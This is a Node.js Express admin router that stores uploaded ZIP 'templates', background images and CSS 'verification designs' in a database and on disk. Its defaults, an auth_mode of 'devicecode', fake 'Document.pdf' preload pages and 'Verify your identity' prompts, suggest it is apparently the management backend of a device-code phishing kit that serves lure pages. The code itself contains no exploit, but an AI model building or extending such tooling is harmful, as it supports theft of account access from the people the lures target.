const express = require('express');
const router = express.Router();
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const AdmZip = require('adm-zip');
const db = require('../database/connection');
const { adminAuth } = require('../middleware/auth');

const zipUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 20 * 1024 * 1024 }, // 20MB
  fileFilter: (req, file, cb) => {
    if (file.mimetype === 'application/zip' || file.originalname.endsWith('.zip')) {
      cb(null, true);
    } else {
      cb(new Error('Only ZIP files are allowed'));
    }
  },
});

const imageUpload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => {
      const dir = path.join(__dirname, '..', '..', 'uploads', 'backgrounds');
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      cb(null, dir);
    },
    filename: (req, file, cb) => {
      const ext = path.extname(file.originalname);
      cb(null, `bg-${Date.now()}-${Math.random().toString(36).substring(2, 8)}${ext}`);
    },
  }),
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB
  fileFilter: (req, file, cb) => {
    const allowed = ['.jpg', '.jpeg', '.png', '.webp'];
    const ext = path.extname(file.originalname).toLowerCase();
    if (allowed.includes(ext)) {
      cb(null, true);
    } else {
      cb(new Error('Only JPG, PNG, and WebP images are allowed'));
    }
  },
});

router.get('/templates', adminAuth, async (req, res) => {
  try {
    const [templates] = await db.query('SELECT * FROM templates ORDER BY name ASC');
    res.json(templates);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.get('/templates/:id', adminAuth, async (req, res) => {
  try {
    const [templates] = await db.query('SELECT * FROM templates WHERE id = ?', [req.params.id]);
    if (!templates.length) return res.status(404).json({ error: 'Template not found' });
    res.json(templates[0]);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.post('/templates', adminAuth, zipUpload.single('zip_file'), async (req, res) => {
  try {
    const { name, category } = req.body;
    if (!name) return res.status(400).json({ error: 'Template name required' });
    if (!req.file) return res.status(400).json({ error: 'ZIP file required' });
    
    const templateSlug = name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
    const templateDir = path.join(__dirname, '..', '..', 'templates', templateSlug);
    
    if (!fs.existsSync(templateDir)) fs.mkdirSync(templateDir, { recursive: true });
    
    const zip = new AdmZip(req.file.buffer);
    const entries = zip.getEntries();
    
    let configJson = null;
    
    for (const entry of entries) {
      if (entry.isDirectory) continue;
      const entryName = path.basename(entry.entryName);
      const filePath = path.join(templateDir, entryName);
      
      if (entryName === 'config.json') {
        configJson = JSON.parse(entry.getData().toString('utf8'));
      }
      
      fs.writeFileSync(filePath, entry.getData());
    }
    
    if (!configJson) {
      configJson = {
        name: name,
        preload: category === 'preload',
        auth_mode: 'devicecode',
        fields: category === 'preload' 
          ? [{ key: 'file_name', label: 'File Name', type: 'text', default: 'Document.pdf' },
             { key: 'pages', label: 'Pages', type: 'number', default: 1 }]
          : [{ key: 'title', label: 'Title', type: 'text', default: 'Verify your identity' },
             { key: 'message', label: 'Message', type: 'text', default: 'Please verify your identity to continue' }],
        background: { default: '', editable: true, blur: true },
      };
      fs.writeFileSync(path.join(templateDir, 'config.json'), JSON.stringify(configJson, null, 2));
    }
    
    let thumbnailUrl = null;
    if (req.body.background_image_url) {
      configJson.background.default = req.body.background_image_url;
      fs.writeFileSync(path.join(templateDir, 'config.json'), JSON.stringify(configJson, null, 2));
    }
    

    const bgFiles = fs.readdirSync(templateDir).filter(f => 
      f.startsWith('background') || f.startsWith('bg-') || f === 'bg.jpg' || f === 'bg.png'
    );
    if (bgFiles.length > 0 && !configJson.background.default) {
      configJson.background.default = bgFiles[0];
      fs.writeFileSync(path.join(templateDir, 'config.json'), JSON.stringify(configJson, null, 2));
    }
    
    const [result] = await db.query(
      'INSERT INTO templates (name, category, version, status, config_json, thumbnail_url, zip_path) VALUES (?, ?, ?, ?, ?, ?, ?)',
      [name, category || 'preload', '1.0.0', 'active', JSON.stringify(configJson), thumbnailUrl, templateDir]
    );
    
    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
      [req.admin.id, 'template_create', `Template: ${name} (${templateSlug})`, req.ip]);
    
    res.status(201).json({ id: result.insertId, slug: templateSlug, config: configJson });
  } catch (err) {

    res.status(500).json({ error: err.message });
  }
});

router.put('/templates/:id', adminAuth, zipUpload.single('zip_file'), async (req, res) => {
  try {
    const [existing] = await db.query('SELECT * FROM templates WHERE id = ?', [req.params.id]);
    if (!existing.length) return res.status(404).json({ error: 'Template not found' });
    
    const { name, category, status } = req.body;
    const template = existing[0];
    let configJson = template.config_json ? JSON.parse(template.config_json) : {};
    
    if (name) configJson.name = name;
    if (category) {
      configJson.preload = category === 'preload';
      if (!configJson.fields) {
        configJson.fields = category === 'preload'
          ? [{ key: 'file_name', label: 'File Name', type: 'text', default: 'Document.pdf' },
             { key: 'pages', label: 'Pages', type: 'number', default: 1 }]
          : [{ key: 'title', label: 'Title', type: 'text', default: 'Verify' },
             { key: 'message', label: 'Message', type: 'text', default: 'Verify your identity' }];
      }
    }
    
    if (req.file) {
      const templateDir = template.zip_path || path.join(__dirname, '..', '..', 'templates', 
        (name || template.name).toLowerCase().replace(/[^a-z0-9]+/g, '-'));
      
      if (!fs.existsSync(templateDir)) fs.mkdirSync(templateDir, { recursive: true });
      
      const zip = new AdmZip(req.file.buffer);
      const entries = zip.getEntries();
      
      for (const entry of entries) {
        if (entry.isDirectory) continue;
        const entryName = path.basename(entry.entryName);
        const filePath = path.join(templateDir, entryName);
        
        if (entryName === 'config.json') {
          const zipConfig = JSON.parse(entry.getData().toString('utf8'));
          configJson = { ...configJson, ...zipConfig };
        }
        
        fs.writeFileSync(filePath, entry.getData());
      }

      fs.writeFileSync(path.join(templateDir, 'config.json'), JSON.stringify(configJson, null, 2));
    }
    
    await db.query(
      'UPDATE templates SET name = ?, category = ?, status = ?, config_json = ? WHERE id = ?',
      [name || template.name, category || template.category, status || template.status, 
       JSON.stringify(configJson), req.params.id]
    );
    
    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
      [req.admin.id, 'template_update', `Template ID: ${req.params.id}`, req.ip]);
    
    res.json({ success: true });
  } catch (err) {

    res.status(500).json({ error: err.message });
  }
});

router.delete('/templates/:id', adminAuth, async (req, res) => {
  try {
    await db.query("UPDATE templates SET status = 'disabled' WHERE id = ?", [req.params.id]);
    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
      [req.admin.id, 'template_delete', `Template ID: ${req.params.id}`, req.ip]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.get('/templates/:id/download', adminAuth, async (req, res) => {
  try {
    const [templates] = await db.query('SELECT * FROM templates WHERE id = ?', [req.params.id]);
    if (!templates.length) return res.status(404).json({ error: 'Template not found' });
    
    const template = templates[0];
    const templateDir = template.zip_path;
    
    if (!templateDir || !fs.existsSync(templateDir)) {
      return res.status(404).json({ error: 'Template files not found on disk' });
    }
    
    const zip = new AdmZip();
    const files = fs.readdirSync(templateDir);
    for (const file of files) {
      const filePath = path.join(templateDir, file);
      if (fs.statSync(filePath).isFile()) {
        zip.addLocalFile(filePath);
      }
    }
    
    const zipBuffer = zip.toBuffer();
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', `attachment; filename="${template.name.replace(/[^a-zA-Z0-9]/g, '_')}.zip"`);
    res.send(zipBuffer);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.post('/templates/:id/background', adminAuth, imageUpload.single('background'), async (req, res) => {
  try {
    const [templates] = await db.query('SELECT * FROM templates WHERE id = ?', [req.params.id]);
    if (!templates.length) return res.status(404).json({ error: 'Template not found' });
    
    if (!req.file) return res.status(400).json({ error: 'Background image required' });
    
    const template = templates[0];
    let configJson = template.config_json ? JSON.parse(template.config_json) : {};
    
    const templateDir = template.zip_path || path.join(__dirname, '..', '..', 'templates', 
      template.name.toLowerCase().replace(/[^a-z0-9]+/g, '-'));
    
    if (!fs.existsSync(templateDir)) fs.mkdirSync(templateDir, { recursive: true });
    
    const bgFilename = 'background' + path.extname(req.file.originalname);
    const bgDestPath = path.join(templateDir, bgFilename);
    fs.copyFileSync(req.file.path, bgDestPath);

    configJson.background = configJson.background || {};
    configJson.background.default = bgFilename;
    configJson.background.editable = true;
    configJson.background.blur = true;
    
    fs.writeFileSync(path.join(templateDir, 'config.json'), JSON.stringify(configJson, null, 2));
    
    await db.query('UPDATE templates SET config_json = ? WHERE id = ?', [JSON.stringify(configJson), req.params.id]);

    fs.unlinkSync(req.file.path);
    
    res.json({ success: true, background: bgFilename, path: `/templates/${path.basename(templateDir)}/${bgFilename}` });
  } catch (err) {

    res.status(500).json({ error: err.message });
  }
});

router.get('/designs', adminAuth, async (req, res) => {
  try {
    const [designs] = await db.query('SELECT * FROM verification_designs ORDER BY name ASC');
    res.json(designs);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.post('/designs', adminAuth, async (req, res) => {
  try {
    const { name, css_content, html_wrapper } = req.body;
    if (!name || !css_content) return res.status(400).json({ error: 'Name and CSS content required' });

    const designSlug = name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
    const cssPath = path.join(__dirname, '..', '..', 'verification-designs', `${designSlug}.css`);
    fs.writeFileSync(cssPath, css_content);
    
    const [result] = await db.query(
      'INSERT INTO verification_designs (name, css_content, html_wrapper, status) VALUES (?, ?, ?, ?)',
      [name, css_content, html_wrapper || '', 'active']
    );
    
    await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
      [req.admin.id, 'design_create', `Design: ${name}`, req.ip]);
    
    res.status(201).json({ id: result.insertId, slug: designSlug });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.put('/designs/:id', adminAuth, async (req, res) => {
  try {
    const { name, css_content, html_wrapper, status } = req.body;
    const [existing] = await db.query('SELECT * FROM verification_designs WHERE id = ?', [req.params.id]);
    if (!existing.length) return res.status(404).json({ error: 'Design not found' });
    
    if (css_content) {
      const designSlug = (name || existing[0].name).toLowerCase().replace(/[^a-z0-9]+/g, '-');
      const cssPath = path.join(__dirname, '..', '..', 'verification-designs', `${designSlug}.css`);
      fs.writeFileSync(cssPath, css_content);
    }
    
    await db.query(
      'UPDATE verification_designs SET name = ?, css_content = ?, html_wrapper = ?, status = ? WHERE id = ?',
      [name || existing[0].name, css_content || existing[0].css_content, 
       html_wrapper || existing[0].html_wrapper, status || existing[0].status, req.params.id]
    );
    
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.delete('/designs/:id', adminAuth, async (req, res) => {
  try {
    await db.query("UPDATE verification_designs SET status = 'disabled' WHERE id = ?", [req.params.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;